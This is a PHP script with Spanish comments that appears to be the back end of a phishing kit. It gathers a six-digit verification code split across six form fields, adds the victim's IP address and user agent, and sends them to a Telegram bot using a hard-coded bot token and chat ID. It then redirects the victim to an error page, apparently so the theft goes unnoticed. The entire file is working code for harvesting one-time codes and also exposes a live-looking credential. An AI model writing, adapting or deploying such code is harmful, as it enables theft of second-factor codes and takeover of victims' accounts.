<?php
// procesar_codigo.php

// Verificar que se recibieron todos los campos esperados
if (
    isset($_POST['code1']) &&
    isset($_POST['code2']) &&
    isset($_POST['code3']) &&
    isset($_POST['code4']) &&
    isset($_POST['code5']) &&
    isset($_POST['code6'])
) {
    // Concatenar los dígitos para formar el código completo
    $codigo = $_POST['code1'] . $_POST['code2'] . $_POST['code3'] . $_POST['code4'] . $_POST['code5'] . $_POST['code6'];

    // Capturar la IP del usuario
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    // Capturar el User Agent del navegador
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Desconocido';

    // Construir el mensaje a enviar
    $mensaje = "Nuevo código recibido:\n";
    $mensaje .= "Código: " . $codigo . "\n";
    $mensaje .= "IP: " . $ip . "\n";
    $mensaje .= "User Agent: " . $user_agent;

    // Configurar los datos del Bot de Telegram
    $bot_token = "6349539696:AAFnhdeO0rNvpGWVG2zrPALUKVuKCdqlhj4";   // Reemplaza con tu token
    $chat_id   = "6065537099";     // Reemplaza con el ID del chat donde se enviará el mensaje

    // Preparar la URL de la API para enviar el mensaje
    $url_api = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
    
    // Datos a enviar mediante POST
    $datos = [
        'chat_id' => $chat_id,
        'text'    => $mensaje
    ];

    // Enviar la solicitud a Telegram mediante cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url_api);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($datos));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // Ejecutar la solicitud y obtener la respuesta
    $respuesta = curl_exec($ch);
    curl_close($ch);

    // Opcional: Redirigir a una página de agradecimiento o mostrar un mensaje
    header("Location: error.php");
    exit();

} else {
    // En caso de que no se hayan enviado los datos necesarios
    echo "Error: Datos incompletos.";
}
?>
